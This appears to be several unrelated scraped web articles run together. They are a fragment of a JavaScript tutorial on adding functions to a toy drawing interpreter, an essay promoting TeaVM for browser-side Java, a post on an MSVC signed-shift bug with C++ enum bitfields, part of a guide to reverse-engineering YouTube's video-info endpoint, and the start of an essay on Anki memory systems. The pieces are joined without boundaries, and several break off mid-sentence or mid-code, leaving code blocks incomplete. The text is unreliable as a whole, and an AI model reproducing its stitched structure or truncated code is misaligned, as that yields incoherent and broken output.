<span>drawTriangle</span><span>(</span><span>...</span><span>)</span></code></pre><p>How would we do it? Let’s follow our intuition again. If we transcribe this to our data representation, here’s how it could look:</p><pre><code><span>  [</span><span>"def"</span><span>, </span><span>"drawTriangle"</span><span>,</span>

What if we did this:</p><pre><code><span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>    </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>  };</span>
<span>};</span></code></pre><p>When we find a <code>fn</code>  instruction, we run <code>parseFnInstruction</code>. This produces a new javascript function. We would replace <code>drawTriangle</code> here with that function:</p><pre><code><span>[</span><span>"drawTriangle"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>So when that function is run, <code>values</code> would become:</p><pre><code><span>[{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>After that, </p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span></code></pre><p>Would create a new <code>variables</code> object, that includes a mapping of the function arguments to these newly provided values:</p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>  </span><span>...</span><span>oldVariables</span><span>,</span>
<span>  left: { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, </span>
<span>  top: { x: </span><span>3</span><span>, y: </span><span>3</span><span> },</span>
<span>  right: {x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span>
<span>  color: </span><span>"blue"</span><span>, </span>
<span>}</span></code></pre><p>Then, we can take the function body, in this case: </p><pre><code><span>      [</span>
<span>        </span><span>"do"</span><span>,</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>      ],</span></code></pre><p>And run it through <code>parseInstruction</code>, with our <code>newVariables</code>. With that <code>"left"</code> would be looked up as a variable and map to <code>{x: 0, y: 0}</code>. </p><p>If we did that, voila, the major work to support functions would be done!</p><p>Let’s follow through on our plan. The first thing we need to do, is to have <code>parseInstruction</code> accept <code>variables</code> as an argument. To do that, we need to update <code>parseInstruction</code>, and wherever it's called:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Next, we’ll want to add a special check to detect if we have a “fn” instruction:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

Java is winning many battles these days with 6 month release cycles,
exciting new features, and more.  However, there is a bigger war
looming: the war for the browser.  This is a war Java can't afford to
lose.  Read on for a winning strategy and what you can do to help.

<h3>A Bit Of History</h3>

In the late 90's and 2000's, Java had a strong presence in the
browser.  Java Applets were Java UIs that ran directly on a web page
— think Canvas but with Java APIs for drawing and sound.  Java
Web Start let you launch full Java UIs from the browser.  Both of
these could communicate with services running on Java App Servers, for
a full-stack Java experience.  Indeed, the initial excitement over
client-side Java led people to try it out server-side, where it became
even more popular.  Remember this for later: client-side dominance has
a history of extending server-side.

<h3>Fast-Forward 20 Years...</h3>

Here in 2020, things have taken a turn for the worse.  All major
browsers have disabled support for Java (and indeed most
non-JavaScript technologies).  Web-based front-ends are
usually coded in JavaScript or some wrapper designed to make it less
problematic (like TypeScript).  

<p>

Yes, you can still make websites using Java technology.  There are
plenty of 'official' technologies like JSP and JSF.  Unfortunately,
these technologies are entirely server-side.  You can generate the
page using Java libraries and business logic, but once it is sent to
the browser it is static and lifeless.  User interaction requires one
of two ugly options:

</p><ul>
  <li> A round-trip back to the server (slow — a bad user experience)
  </li><li> JavaScript embedded in the middle of your otherwise pristine
  Java-generated page
</li></ul>

Some teams forgo Java altogether and build their front-ends entirely
in JavaScript.  Having made that decision, some go even further and
look at options for running JavaScript server-side too.  Sound
familiar?  This is how Java once took over the computing world.

<h3>Winning Many Battles</h3>

Java fortunately has not stood still.  The Java Enhancement Process
(JEP) has avoided bureaucratic quicksand and has produced numerous
improvements to Java through the years, most of them well ahead of
JavaScript.

<p>

Improvements are now coming every 6 months, thanks to the new
release cadence.  Already new garbage collectors, easier to use
strings, and improved threading are available either for production or
for evaluation.  However, when you think about which of these
innovations are for building browser-based apps, you quickly realize
that Java client-side innovation has all but stopped, at least via the
official channels.

</p><p>

As the famous saying goes, <strong>we don't want to win the battle but lose
the war</strong>.  How can Java increase its relevance?  How can Java win back
client-side developers?  How can Java prevent other technologies from
leveraging front-end dominance to win the back-end, like Java once did
to other technologies?

</p><h3>How To Win The War</h3>

To win the war, Java needs a strong client-side option.  One that lets
developers make modern web applications using Java code.  One that
leverages web technologies.  One that supports components.  One that
builds quickly.  One that produces fast-downloading, high performance,
100-Lighthouse-scoring apps.  One that plays nicely with other JVM
languages.  What does Java need?

<h3>What Java needs Is TeaVM</h3>

TeaVM is an ahead-of-time transpiler that compiles Java classes to
JavaScript.  It lets your Java code interact with Web APIs and the
DOM.  It also includes a rich framework for developing web
applications called Flavour.  Some of the many powerful features of
TeaVM and Flavour:

<ul>
  <li> Numerous Web APIs ready for use via type-safe Java wrappers.
  </li><li> A rich component framework to build apps from reusable components
  </li><li> Numerous pre-built components
  </li><li> Single-page app support with a shadow DOM and routing
  </li><li> Easy, transparent calls to web services
</li></ul>

If you are a Java developer who is building a browser-based user
interface, TeaVM is for you.  There are two main styles of TeaVM apps:

<ul>
  <li> Graphical apps that draw their entire UI on a Canvas and have
  very little HTML or CSS.  These apps may just need TeaVM.
  </li><li> Single-page web apps that use HTML and CSS.  These apps benefit
  from using the Flavour framework on top of TeaVM to handle routing,
  invoking REST services, and JSON parsing.
</li></ul>

However, it doesn't have to be all or nothing, there are hybrid
possibilities like the following:

<ul>
  <li> A primarily Canvas-based app that uses Flavour to occasionally
  show other HTML pages.
  </li><li> A primarily HTML-based app that includes a Canvas on certain
  pages.
</li></ul>

Whatever path you choose, you'll find that writing your client-side in
the same language as your backend is a truly liberating experience.
Share data structures throughout your app.  Use your IDE to refactor
interfaces and model classes in the client and server simultaneously.
Use the same tooling (build tool, dependency management,
static/dynamic analysis tools) for your entire product.  Productivity
and developer satisfaction are dramatically improved.

<h3>How To Move Forward</h3>

TeaVM is ready for use in your projects.  It is stable, documented,
and has <a href="https://github.com/konsoletyper/teavm-flavour/tree/master/example">example</a>
<a href="https://github.com/konsoletyper/teavm/tree/master/samples/hello">code</a>
on the TeaVM site, as well as <a href="https://frequal.com/tea-sampler/">elsewhere</a>.

<p>

Most of all, TeaVM needs your endorsement and promotion.  Instead of
discussing and advocating legacy Java web technologies, help ensure
Java has another 25 years of success — please promote and
use TeaVM!

</p><p>

How to help?

</p><ul>
  <li> <a href="http://teavm.org/docs/intro/getting-started.html">Build your
  first TeaVM project</a>.  It takes just 2 commands.
  </li><li> <a href="https://groups.google.com/u/2/g/teavm">Read the
  forums</a> where developers discuss TeaVM and Flavour
  </li><li> <a href="https://github.com/konsoletyper/teavm">Dive into the
  source</a>.  The TeaVM and Flavour code is well-organized and
  extremely useful.  When creating your own JavaScript mappings and
  Flavour components, you have a large collection of examples to
  reference in the project codebase.
</li></ul>

Thank you for reading this.  Let's win this war together!

<![CDATA[Highway to hell: C++ enums and bitfields]]>
            </title>

October 25, 2020 | https://walac.github.io/curious-bug-enum-bitfield/ | <a href="https://web.archive.org/web/*/https://walac.github.io/curious-bug-enum-bitfield/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>C++ enums historically gave me some headaches due to the fact that compilers are free to choose the size
of the type for whatever criteria they think. This makes particularly hard to write portable code among
compilers from ABI point of view (Visual C++ vs C++ Builder, anyone?).</p>

<p>Some days ago I was debugging a problem with <a href="https://github.com/dalihub/dali-toolkit">dali-toolkit</a>
and the enum story scalated to another level.</p>

<p>Let me give you some background: <a href="https://github.com/dalihub/dali-toolkit">dali-toolkit</a> loads textures
using a background worker thread that is responsible to load the image files to memory. I was looking
why some textures didn’t load in <code>Windows</code>. To make the asynchronous loading possible it implements
a small state machine and it keeps all information about the texture in a type called <code>TextureInfo</code>.</p>

<p>Here is a partial definition of the structure:</p>

<div><div><pre><code><span>struct</span> <span>TextureInfo</span> <span>{</span>
		<span>// ....</span>
    <span>LoadState</span> <span>loadState</span><span>:</span><span>4</span><span>;</span>         <span>///&lt; The load state showing the load progress of the Texture</span>
    <span>FittingMode</span><span>::</span><span>Type</span> <span>fittingMode</span><span>:</span><span>3</span><span>;</span> <span>///&lt; The requested FittingMode</span>
    <span>Dali</span><span>::</span><span>SamplingMode</span><span>::</span><span>Type</span> <span>samplingMode</span><span>:</span><span>3</span><span>;</span> <span>///&lt; The requested SamplingMode</span>
    <span>StorageType</span> <span>storageType</span><span>:</span><span>2</span><span>;</span>     <span>///&lt; CPU storage / GPU upload;</span>
		<span>// ....</span>
<span>};</span>
</code></pre></div></div>

<p>All these custom types are enums defined elsewhere. Yes, you read right, enums + bit fields, what
possibly can go wrong? To illustrate the root cause of the bug, let’s write a toy sample:</p>

<div><div><pre><code><span>enum</span> <span>Animal</span> <span>{</span>
    <span>Cat</span><span>,</span>
    <span>Dog</span><span>,</span>
    <span>Horse</span><span>,</span>
    <span>Turtle</span><span>,</span>
<span>};</span>

<span>enum</span> <span>Breed</span> <span>{</span>
    <span>BorderCollie</span><span>,</span>
    <span>GoldenRetriever</span><span>,</span>
    <span>GermanShepard</span><span>,</span>
    <span>Husky</span><span>,</span>
<span>};</span>

<span>enum</span> <span>Adopted</span> <span>{</span>
    <span>No</span><span>,</span>
    <span>Yes</span><span>,</span>
<span>};</span>

<span>struct</span> <span>AnimalInfo</span> <span>{</span>

<p>Now, using <a href="https://godbolt.org/">godbolt</a>, we can view the assembly code generated by different compilers.
In particular, let’s look at the assembly code for the <code>main</code> function. Firstly, the the gcc generated
code. I added comments to the parts interesting to us:</p>

<div><div><pre><code>main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 16
        lea     rax, [rbp-8]
        mov     ecx, 1
        mov     edx, 2
        mov     esi, 1
        mov     rdi, rax
        call    AnimalInfo::AnimalInfo(Animal, Breed, Adopted)
        movzx   eax, BYTE PTR [rbp-8] // load the information
        shr     al, 2   	// breed is in the bits 2 and 3, so shift right 2 bits
        and     eax, 3  	// breed is only two bits long
        movzx   eax, al  	// eax = breed value
        mov     DWORD PTR [rbp-4], eax // store it in our variable
        mov     eax, 4    // AnimalInfo is 4 bytes long
        leave
        ret
</code></pre></div></div>

<p>Here is clang. It uses different registers but is essentially the same code:</p>

<div><div><pre><code>main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 16
        mov     dword ptr [rbp - 4], 0
        lea     rdi, [rbp - 8]
        mov     eax, 1
        mov     esi, eax
        mov     edx, 2
        mov     ecx, eax
        call    AnimalInfo::AnimalInfo(Animal, Breed, Adopted)
        mov     r8b, byte ptr [rbp - 8]
        shr     r8b, 2
        and     r8b, 3
        movzx   eax, r8b
        mov     dword ptr [rbp - 12], eax
        mov     eax, 4
        add     rsp, 16
        pop     rbp
        ret
</code></pre></div></div>

<p>Now the msvc compiler:</p>

<div><div><pre><code>main PROC
$LN3:
  sub rsp, 56 ; 00000038H
  mov r9d, 1
  mov r8d, 2
  mov edx, 1
  lea rcx, QWORD PTR animal$[rsp]
  call AnimalInfo::AnimalInfo(Animal,Breed,Adopted) ; AnimalInfo::AnimalInfo
  mov eax, DWORD PTR animal$[rsp]
  shl eax, 28
  sar eax, 30 // OH NO! SIGNED SHIFT!!!
  mov DWORD PTR breed$[rsp], eax
  mov eax, 4
  add rsp, 56 ; 00000038H
  ret 0
main ENDP
</code></pre></div></div>

<p>Before commenting about the bug generated by msvc, let me praise the compiler optimizer,
it could get the breed value in two instructions, while clang and gcc needed three.
Very smart! Too bad that code is wrong. I think it is better to undestand the issue if we
view the bit layout of the word holded by AnimalInfo:</p>

<div><div><pre><code>	-------------------------------------
	|  31-5  |    4    |  3-2  |  1-0   |
	-------------------------------------
	| Unused | Adopted | Breed | Animal |
	-------------------------------------
</code></pre></div></div>

<p>So, the code shifts 28 bits to left, moving <code>Breed</code> to the bits 31 and 30, then it
shifts 30 bits to the right, but it does a signed shift, filling the
shifted bits with the value of the most significant bit. The <code>Breed</code> value is
<code>GermanShepard</code>, which is 2. So, when we shift left, the bit 31 will hold the value
1, and when we shift right, we end up with the final value <code>0xfffffffe</code>! The reason this happens
is because msvc assumes the enum is a signed integer by default and, combined with
the use of bit fields, yields the bug. This is precisely what happened in
<a href="https://github.com/dalihub/dali-toolkit">dali-toolkit</a>.</p>

<p>Once we understood the problem, we can solve it easily by forcing the enum to an unsigned integer:</p>

<div><div><pre><code><span>enum</span> <span>class</span> <span>Animal</span><span>:</span> <span>unsigned</span> <span>int</span> <span>{</span>
    <span>Cat</span><span>,</span>
    <span>Dog</span><span>,</span>
    <span>Horse</span><span>,</span>
    <span>Turtle</span><span>,</span>
<span>};</span>

<span>enum</span> <span>class</span> <span>Breed</span><span>:</span> <span>unsigned</span> <span>int</span> <span>{</span>
    <span>BorderCollie</span><span>,</span>
    <span>GoldenRetriever</span><span>,</span>
    <span>GermanShepard</span><span>,</span>
    <span>Husky</span><span>,</span>
<span>};</span>

<span>enum</span> <span>class</span> <span>Adopted</span><span>:</span> <span>unsigned</span> <span>int</span> <span>{</span>
    <span>No</span><span>,</span>
    <span>Yes</span><span>,</span>
<span>};</span>

<span>struct</span> <span>AnimalInfo</span> <span>{</span>
    <span>Animal</span> <span>animal</span><span>:</span><span>2</span><span>;</span>
    <span>Breed</span> <span>breed</span><span>:</span><span>2</span><span>;</span>
    <span>Adopted</span> <span>adopted</span><span>:</span><span>1</span><span>;</span>

    <span>AnimalInfo</span><span>(</span><span>Animal</span> <span>a</span><span>,</span> <span>Breed</span> <span>b</span><span>,</span> <span>Adopted</span> <span>ad</span><span>)</span>
        <span>:</span> <span>animal</span><span>(</span><span>a</span><span>),</span> <span>breed</span><span>(</span><span>b</span><span>),</span> <span>adopted</span><span>(</span><span>ad</span><span>)</span> <span>{}</span>
<span>};</span>

<span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span> <span>{</span>
    <span>AnimalInfo</span> <span>animal</span><span>(</span><span>Animal</span><span>::</span><span>Dog</span><span>,</span> <span>Breed</span><span>::</span><span>GermanShepard</span><span>,</span> <span>Adopted</span><span>::</span><span>Yes</span><span>);</span>

    <span>auto</span> <span>breed</span> <span>=</span> <span>animal</span><span>.</span><span>breed</span><span>;</span>

    <span>return</span> <span>sizeof</span><span>(</span><span>AnimalInfo</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Now the generated code does what it is supposed to do:</p>

<div><div><pre><code>main PROC
$LN3:
  sub rsp, 56 ; 00000038H
  mov r9d, 1
  mov r8d, 2
  mov edx, 1
  lea rcx, QWORD PTR animal$[rsp]
  call AnimalInfo::AnimalInfo(Animal,Breed,Adopted) ; AnimalInfo::AnimalInfo
  mov eax, DWORD PTR animal$[rsp]
  shr eax, 2
  and eax, 3
  mov DWORD PTR breed$[rsp], eax
  mov eax, 4
  add rsp, 56 ; 00000038H
  ret 0
main ENDP
</code></pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Almost a year ago, I started developing <a href="https://github.com/Tyrrrz/YoutubeExplode">YoutubeExplode</a>, a library that scraps information on YouTube videos and lets you download them. Originally, my main motivation for developing it was simply to gain experience, as the task involved a lot of research and reverse-engineering. Nowadays, YoutubeExplode is arguably the most consistent and robust .NET library for dealing with YouTube.</p>
<p>Since this is a relatively popular discussion topic among many beginner developers, I thought that I could help out by sharing the knowledge I found by spending dozens of hours staring at Chrome Developer Tools.</p>
<p><em>Note: even though the base principles explained here are unlikely to change, some information in this post may become outdated. This post is relevant to YoutubeExplode v4.1 (16-Feb-2018).</em></p>
<h2>Getting video metadata</h2>
<p>In order to find and resolve media streams, you need to first get video metadata. There are a few ways to do it, but the most reliable one is by querying an AJAX endpoint used internally by YouTube’s iframe embed API. The format is as follows: <a href="https://www.youtube.com/get_video_info?video_id=%7BvideoId%7D">https://www.youtube.com/get_video_info?video_id={videoId}</a>.</p>
<p>The request can take a lot of different parameters, but at a minimum it needs a video ID — the value in the URL that comes after <code>/watch?v=</code>, for example <code>e_S9VvJM1PI</code>.</p>
<p>The response contains URL-encoded metadata, which has to be decoded first before it’s usable. After that, you can map the parameter names to values in a dictionary for easier access. Some parameter values are nested objects themselves, so they can in turn be mapped to nested dictionaries.</p>
<p>Here’s an example of the decoded metadata (truncated for brevity):</p>
<div data-language="ini"><pre><code><span>status</span><span><span>=</span>ok</span>

<p>As you can see, there is quite a lot of information that can be extracted straight away.</p>
<p>Let’s also look at some important optional parameters that this request can take:</p>
<ul>
<li><code>hl</code> — name of the culture used to localize some strings. If not set, it defaults to culture inferred from your IP. Use <code>hl=en</code> to force English language on all strings.</li>
<li><code>el</code> — type of YouTube page from where the request was made. This decides what kind of information will be available in the response. In some cases, you will need to set this parameter to a certain value depending on the type of the video, in order to avoid errors. Defaults to <code>embedded</code>.</li>
<li><code>sts</code> — some kind of session identifier, used to synchronize information between requests. Defaults to empty.</li>
</ul>
<h3>The “el” parameter</h3>
<p>The <code>el</code> request parameter can take multiple values and it affects what kind of data you will receive as a response. There are only a few that actually matter though, so I’ll list them here:</p>
<ul>
<li><code>embedded</code>, the default value. YouTube uses this when requesting information for embedded videos. Doesn’t work with videos that aren’t embeddable, but works with age-restricted videos.</li>
<li><code>detailpage</code>, alternative value, contains a bit more info. Conversely, works with videos that aren’t embeddable, but doesn’t work with age-restricted videos.</li>
</ul>
<p>YoutubeExplode uses <code>el=embedded</code> for the first query. If it fails because the video cannot be embedded, it then retries with <code>el=detailpage</code>.</p>
<h3>Handling errors</h3>
<p>When the request fails, the response will contain only a few fields:</p>
<ul>
<li><code>status</code> — which is equal to <code>fail</code>.</li>
<li><code>errorcode</code> — an integer code that identifies the error.</li>
<li><code>reason</code> — text message that explains why the video is not available.</li>
</ul>
<p>Error codes seem to be very generic and most of the time it’s either <code>100</code> or <code>150</code> so they aren’t very useful at determining what went wrong.</p>
<h3>Paid videos</h3>
<p>Some videos need to be purchased before they can be watched. In such cases, there will be:</p>
<ul>
<li><code>requires_purchase</code>, which equal to <code>1</code>.</li>
<li><code>ypc_vid</code>, ID of a preview video which can be watched for free.</li>
</ul>
<h2>Resolving media streams</h2>
<p>Media streams and their metadata come in many different forms.</p>
<h3>Muxed streams</h3>
<p>Multiplexed (muxed) streams are the type that contain both video and audio tracks in the same stream. YouTube provides these streams only in low qualities — the best they can be is 720p30.</p>
<p>Metadata for these streams is contained within the URL-encoded response mentioned earlier, inside the <code>url_encoded_fmt_stream_map</code> parameter. To extract it, you simply need to split the value by <code>,</code> and then URL-decode each part.</p>
<p>This is how decoded metadata looks, for an individual muxed stream:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>43</span>
<span>type</span><span><span>=</span>video/webm; codecs="vp8.0, vorbis"</span>
<span>fallback_host</span><span><span>=</span>redirector.googlevideo.com</span>
<span>url</span><span><span>=</span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?itag=43&amp;lmt=1367519763212098&amp;ipbits=0&amp;key=yt6&amp;mime=video%2Fwebm&amp;expire=1511401259&amp;mn=sn-3c27sn7k&amp;mm=31&amp;ms=au&amp;mv=m&amp;mt=1511379591&amp;ei=y9IVWuuyKI-YdLvnm8AO&amp;sparams=dur%2Cei%2Cgcr%2Cid%2Cinitcwndbps%2Cip%2Cipbits%2Citag%2Clmt%2Cmime%2Cmm%2Cmn%2Cms%2Cmv%2Cnh%2Cpl%2Cratebypass%2Crequiressl%2Csource%2Cexpire&amp;ip=255.255.255.255&amp;id=o-AJuM11wvxuVl2WBgfb3nr6zbmXsFGQvhMelDobZ_KOrE&amp;nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE&amp;requiressl=yes&amp;gcr=ua&amp;source=youtube&amp;ratebypass=yes&amp;pl=24&amp;initcwndbps=1112500&amp;dur=0.000</span>
<span>s</span><span><span>=</span>9599599594B0133328AA570AE0129E58478D7BCE9D226F.15ABC404267945A3F64FB4E42074383FC4FA80F5</span>
<span>quality</span><span><span>=</span>medium</span></code></pre></div>
<p>You will be interested in the following properties:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
</ul>
<p>Note: I’ve encountered cases when <a href="https://github.com/Tyrrrz/YoutubeExplode/issues/36">some of the muxed streams were removed</a> despite still appearing in the metadata. Therefore it’s recommended to send HEAD requests to check that each stream is still available. You can get content length as well while you’re at it, since it’s not present in the metadata.</p>
<h3>Adaptive streams</h3>
<p>YouTube also uses video-only and audio-only streams. These come at highest available qualities, with no limitations.</p>
<p>Similarly to muxed streams, metadata for these streams can be extracted from <code>adaptive_fmts</code> parameter. Here’s how it looks:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>134</span>

<p>Adaptive streams have a slightly extended set of properties. I’ll list the useful ones:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
<li><code>clen</code> — content length of the stream in bytes.</li>
<li><code>bitrate</code> — stream bitrate in kbit/sec.</li>
<li><code>size</code> — video resolution (video-only).</li>
<li><code>fps</code> — video framerate (video-only).</li>
</ul>
<h3>Adaptive streams in DASH manifest</h3>
<p>Video info may contain URL of a DASH manifest inside the <code>dashmpd</code> parameter. It’s not always present and some videos might never have it at all.</p>
<p>To resolve metadata of these streams, you need to first download the manifest using the provided URL. Sometimes a manifest can be protected. If it is, you should be able to find the signature inside the URL — it’s the value separated by slashes that comes after <code>/s/</code>.</p>
<p>Streams in DASH can also be segmented — each segment starting at a given point and lasting only a second or two. This is the type that your browser normally uses when playing a video on YouTube — it lets it easily adjust quality based on network conditions. Segmented streams are also used for livestream videos. This post will not be covering them, however, as processing them is not required to download videos.</p>

      <p>
      One day in the mid-1920s, a Moscow newspaper reporter named
      Solomon Shereshevsky entered the laboratory of the psychologist
      Alexander Luria. Shereshevsky's boss at the newspaper had
      noticed that Shereshevsky never needed to take any notes, but
      somehow still remembered all he was told, and had suggested he
      get his memory checked by an expert.
    </p>

    <p>
      Luria began testing Shereshevsky's memory. He began with simple
      tests, short strings of words and of numbers. Shereshevsky
      remembered these with ease, and so Luria gradually increased the
      length of the strings. But no matter how long they got,
      Shereshevsky could recite them back.  Fascinated, Luria went on
      to study Shereshevsky's memory for the next 30 years.  In a book
      summing up his research*<span>* Alexander
      Luria, “The Mind of a Mnemonist”, Harvard University
      Press (1968).</span>, Luria reported that:
    </p>

    <blockquote>
      [I]t appeared that there was no limit either to
      the <em>capacity</em> of S.'s memory or to the <em>durability of
      the traces he retained</em>. Experiments indicated that he had
      no difficulty reproducing any lengthy series of words whatever,
      even though these had originally been presented to him a week, a
      month, a year, or even many years earlier. In fact, some of
      these experiments designed to test his retention were performed
      (without his being given any warning) fifteen or sixteen years
      after the session in which he had originally recalled the
      words. Yet invariably they were successful.
    </blockquote>
      
    <p>
      Such stories are fascinating. Memory is fundamental to our
      thinking, and the notion of having a perfect memory is
      seductive.  At the same time, many people feel ambivalent about
      their own memory. I've often heard people say “I don't
      have a very good memory”, sometimes sheepishly, sometimes
      apologetically, sometimes even defiantly.
    </p>

    <p>
      Given how central memory is to our thinking, it's natural to ask
      whether computers can be used as tools to help improve our
      memory. This question turns out to be highly generative of good
      ideas, and pursuing it has led to many of the most important
      vision documents in the history of computing. One early example
      was Vannevar Bush's 1945 proposal*<span>*
      Vannevar
      Bush, <a href="https://www.theatlantic.com/magazine/archive/1945/07/as-we-may-think/303881/">As
      We May Think</a>, The Atlantic (1945).</span> for a mechanical
      memory extender, the memex. Bush wrote:
    </p>

    <blockquote>
      A memex is a device in which an individual stores all his books,
      records, and communications, and which is mechanized so that it
      may be consulted with exceeding speed and flexibility. It is an
      enlarged intimate supplement to his memory.
    </blockquote>

    <p>
      The memex vision inspired many later computer pioneers,
      including Douglas Engelbart's ideas about the augmentation of
      human intelligence, Ted Nelson's ideas about hypertext, and,
      indirectly, Tim Berners-Lee's conception of the world wide
      web*<span>* See, for example: Douglas
      Engelbart, <a href="http://augmentingcognition.com/assets/Engelbart1962.pdf">Augmenting Human
      Intellect</a> (1962); Ted
      Nelson, <a href="https://dl.acm.org/citation.cfm?id=806036">Complex
      information processing: a file structure for the complex, the
      changing and the indeterminate</a> (1965); and Tim
      Berners-Lee, <a href="https://w3.org/History/1989/proposal.html">Information
      Management: a Proposal</a> (1989).</span>. In his proposal for
      the web, Berners-Lee describes the need for his employer (the
      particle physics organization CERN) to develop a collective
      institutional memory,
    </p>

    <blockquote>
      a pool of information to develop which could grow and evolve
      with the organization and the projects it describes.
    </blockquote>


    <p>
      These are just a few of the many attempts to use computers to
      augment human memory. From the memex to the web to wikis to
      <a href="https://orgmode.org/">org-mode</a>
      to <a href="https://en.wikipedia.org/wiki/Project_Xanadu">Project
      Xanadu</a> to attempts
      to <a href="https://users.speakeasy.net/~lion/nb/book.pdf">make
      a map of every thought a person thinks</a>: the augmentation of
      memory has been an extremely generative vision for computing.
    </p>

      <p>
	In this essay we investigate personal memory systems, that is,
	systems designed to improve the long-term memory of a single
	person. In the first part of the essay I describe my personal
	experience using such a system, named Anki. As we'll see, Anki
	can be used to remember almost anything. That is, Anki makes
	memory a <em>choice</em>, rather than a haphazard event, to be
	left to chance. I'll discuss how to use Anki to understand
	research papers, books, and much else. And I'll describe
	numerous patterns and anti-patterns for Anki use. While Anki
	is an extremely simple program, it's possible to develop
	virtuoso skill using Anki, a skill aimed at understanding
	complex material in depth, not just memorizing simple facts.
      </p>

      <p>
	The second part of the essay discusses personal memory systems
	in general. Many people treat memory ambivalently or even
	disparagingly as a cognitive skill: for instance, people often
	talk of “rote memory” as though it's inferior to
	more advanced kinds of understanding. I'll argue against this
	point of view, and make a case that memory is central to
	problem solving and creativity. Also in this second part,
	we'll discuss the role of cognitive science in building
	personal memory systems and, more generally, in building
	systems to augment human cognition.  In a future
	essay, <a href="http://augmentingcognition.com/taylip.html">Toward a Young Lady's Illustrated
	Primer</a>, I will describe more ideas for personal memory
	systems.
      </p>

      <p>
	The essay is unusual in style. It's not a conventional
	cognitive science paper, i.e., a study of human memory and how
	it works. Nor is it a computer systems design paper, though
	prototyping systems is my own main interest. Rather, the essay
	is a distillation of informal, <em>ad hoc</em> observations
	and rules of thumb about how personal memory systems work. I
	wanted to understand those as preparation for building systems
	of my own. As I collected these observations it seemed they
	may be of interest to others. You can reasonably think of the
	essay as a how-to guide aimed at helping develop virtuoso
	skills with personal memory systems. But since writing such a
	guide wasn't my primary purpose, it may come across as a
	more-than-you-ever-wanted-to-know guide.
      </p>

      <p>
	To conclude this introduction, a few words on what the essay
	won't cover. I will only briefly discuss visualization
	techniques such as memory palaces and the method of loci.  And
	the essay won't describe the use of pharmaceuticals to improve
	memory, nor possible future brain-computer interfaces to
	augment memory. Those all need a separate treatment. But, as
	we shall see, there are already powerful ideas about personal
	memory systems based solely on the structuring and
	presentation of information.
      </p>

      <h2>Part I: How to remember almost anything: the Anki
      system</h2>

    <p>
      I'll begin with an account of my own experience with the
      personal memory
      system <a href="https://apps.ankiweb.net/">Anki</a>*<span>*
      I've no affiliation at all with Anki. Other similar systems
      include <a href="https://mnemosyne-proj.org/">Mnemosyne</a>
      and <a href="https://supermemo.com/">SuperMemo</a>. My limited
      use suggests Mnemosyne is very similar to Anki.  SuperMemo runs
      only on Windows, and I haven't had an opportunity to use it,
      though I have been influenced by essays on
      the <a href="https://supermemo.com/">SuperMemo
      website</a>.<p>I won't try to hide my enthusiasm for Anki
      behind a respectable facade of impartiality: it's a significant
      part of my life. Still, it has many limitations, and I'll
      mention some of them through the essay. </p></span>. The material
      is, as mentioned above, quite personal, a collection of my own
      observations and informal rules of thumb.  Those rules of thumb
      may not apply to others; indeed, I may be mistaken about how
      well they apply to me. It's certainly not a properly controlled
      study of Anki usage!  Still, I believe there is value in
      collecting such personal experiences, even if they are anecdotal
      and impressionistic. I am not an expert on the cognitive science
      of memory, and I'd appreciate corrections to any errors or
      misconceptions.
    </p>

    <!--
      <p>
